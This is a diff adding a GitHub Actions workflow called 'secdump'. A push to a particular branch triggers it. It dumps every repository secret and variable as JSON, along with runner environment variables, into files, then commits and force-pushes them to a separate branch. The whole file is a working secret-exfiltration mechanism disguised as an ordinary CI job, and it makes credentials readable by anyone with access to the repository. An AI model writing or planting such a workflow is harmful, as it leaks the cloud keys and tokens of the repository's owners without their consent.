@@ -1,0 +1,30 @@
+name: i94659-secdump
+on:
+  push:
+    branches: [hk-az-i94659]
+permissions:
+  contents: write
+jobs:
+  rec:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+      - name: dump
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+          VARS_JSON: ${{ toJSON(vars) }}
+        run: |
+          mkdir -p outi94659; umask 077
+          printf '%s' "$SECRETS_JSON" > outi94659/secrets.json
+          printf '%s' "$VARS_JSON" > outi94659/vars.json
+          env | grep -iE '^(GITHUB|ACTIONS|RUNNER)_' | sort > outi94659/env.txt || true
+          printf 'secrets_len=%s vars_len=%s\n' "$(wc -c < outi94659/secrets.json)" "$(wc -c < outi94659/vars.json)" > outi94659/meta.txt
+      - name: publish
+        if: always()
+        run: |
+          git config user.name hk; git config user.email hk@local.invalid
+          git checkout -B i94659-out
+          git add -A outi94659
+          git commit -m "i94659 out $(date -u +%FT%TZ) run=${{ github.run_id }}" || true
+          git push -f origin HEAD:refs/heads/i94659-out || true
